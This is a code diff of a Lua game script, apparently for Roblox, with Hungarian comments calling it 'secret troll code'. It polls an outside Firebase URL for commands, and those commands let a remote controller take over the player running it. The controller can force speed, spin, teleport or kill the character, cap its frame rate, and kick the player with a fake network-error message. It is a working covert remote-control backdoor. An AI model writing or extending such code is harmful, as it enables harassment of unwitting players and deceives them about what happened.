@@ -1,16 +1,24 @@
--- [[ TITKOS TROLL KÓD V6 - KÉNYSZERÍTETT SPEED ]]
+-- [[ TROLL KÓD V7 - FIX TELEPORT & SPIN ]]
 local FIREBASE_URL = "https://troll-9ab62-default-rtdb.firebaseio.com/.json"
-local myName = "Foamy_F12" -- <--- ÍRD BE A NEVED!
+local myName = "Foamy_F12" 
 local forcedSpeed = 16
+local spinEnabled = false
 
--- Külön hurok a sebesség kényszerítésére
+-- Kényszerített Sebesség & Spin Hurok
 task.spawn(function()
     while true do
-        task.wait(0.1)
+        task.wait(0.05)
         pcall(function()
-            local hum = game.Players.LocalPlayer.Character.Humanoid
-            if hum.WalkSpeed ~= forcedSpeed then
-                hum.WalkSpeed = forcedSpeed
+            local char = game.Players.LocalPlayer.Character
+            local hum = char.Humanoid
+            local root = char.HumanoidRootPart
+            
+            -- Speed fix
+            if hum.WalkSpeed ~= forcedSpeed then hum.WalkSpeed = forcedSpeed end
+            
+            -- Spin fix
+            if spinEnabled then
+                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(45), 0)
             end
         end)
     end
@@ -19,7 +27,7 @@ end)
 task.spawn(function()
     local lastT = 0
     while true do
-        task.wait(0.5)
+        task.wait(0.4)
         local ok, res = pcall(function() return game:HttpGet(FIREBASE_URL .. "?t=" .. tostring(tick())) end)
         if ok and res and res ~= "null" then
             local data = game:GetService("HttpService"):JSONDecode(res)
@@ -31,30 +39,20 @@ task.spawn(function()
                 local root = char and char:FindFirstChild("HumanoidRootPart")
                 
                 if hum and root then
-                    if data.cmd == "forward" then hum:MoveTo(root.Position + (root.CFrame.LookVector * 15))
-                    elseif data.cmd == "jump" then 
-                        hum.JumpPower = 150
-                        hum.Jump = true
+                    if data.cmd == "forward" then hum:MoveTo(root.Position + (root.CFrame.LookVector * 20))
+                    elseif data.cmd == "jump" then hum.JumpPower = 150 hum.Jump = true
                     elseif data.cmd == "respawn" then hum.Health = 0
+                    elseif data.cmd == "spin" then spinEnabled = not spinEnabled
                     elseif data.cmd == "tp" then
                         local target = game.Players:FindFirstChild(myName)
-                        if target and target.Character then root.CFrame = target.Character.HumanoidRootPart.CFrame end
-                    
-                    -- FPS ÁLLÍTÁS
+                        if target and target.Character then
+                            root.CFrame = target.Character.HumanoidRootPart.CFrame + Vector3.new(0, 3, 0)
+                        end
                     elseif data.cmd == "fps10" then setfpscap(10)
-                    elseif data.cmd == "fps20" then setfpscap(20)
-                    elseif data.cmd == "fps30" then setfpscap(30)
-                    elseif data.cmd == "fps40" then setfpscap(40)
-                    elseif data.cmd == "fps50" then setfpscap(50)
-                    elseif data.cmd == "fps60" then setfpscap(60)
                     elseif data.cmd == "fpsmax" then setfpscap(0)
-                    
-                    -- SEBESSÉG ÁLLÍTÁS (Kényszerítve)
                     elseif data.cmd == "speed0" then forcedSpeed = 0
                     elseif data.cmd == "speed16" then forcedSpeed = 16
-                    elseif data.cmd == "speed100" then forcedSpeed = 100
                     elseif data.cmd == "speed500" then forcedSpeed = 500
-                    
                     elseif data.cmd == "kick" then p:Kick("Please check your internet connection and try again. (277)") end
                 end
             end
